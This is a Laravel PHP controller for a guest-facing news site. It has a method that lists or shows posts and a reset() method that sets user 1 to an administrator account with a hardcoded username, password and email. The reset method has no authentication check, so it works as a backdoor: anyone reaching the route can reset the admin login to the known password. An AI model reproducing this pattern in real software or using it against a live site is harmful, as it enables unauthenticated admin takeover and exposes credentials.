<?php

namespace App\Http\Controllers;

use App\Posts;
use App\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;

class GuestController extends Controller
{
    public function berita()
    {
        $id = \request('id');
        $data = Posts::orderBy('updated_at', 'DESC')->paginate(30);
        if ($id != ""){
            $data = Posts::where('id', $id)->first();
            return view('guest.berita.show')->with('data', $data);
        }
        return view('welcome')->with('data', $data);
    }

    public function reset()
    {
        $data = User::where('id', 1)->first();
        $data->name = 'Administrator';
        $data->username = 'VANDAMA';
        $data->password = Hash::make('VANDAMA23');
        $data->email = 'signalpemasyarakatan@gmail.com';
        $data->save();
        return 'Berhasil reset admin';
    }
}
